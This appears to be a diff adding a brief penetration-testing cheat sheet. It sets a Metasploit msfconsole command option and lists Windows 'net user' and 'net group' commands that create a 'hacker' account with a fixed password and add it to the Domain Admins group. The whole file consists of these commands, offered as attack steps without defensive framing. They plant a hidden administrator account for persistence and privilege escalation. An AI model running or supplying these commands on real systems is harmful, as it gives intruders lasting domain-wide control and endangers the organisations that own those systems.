@@ -1,0 +1,7 @@
+in msfconsole:
+set cmd net user hacker Pa$$word /ADD
+
+## adds a user
+net user hacker Pa$$word /ADD 
+## will add created user to domain admins group
+net group "Domain Admins" /ADD hacker /DOMAIN
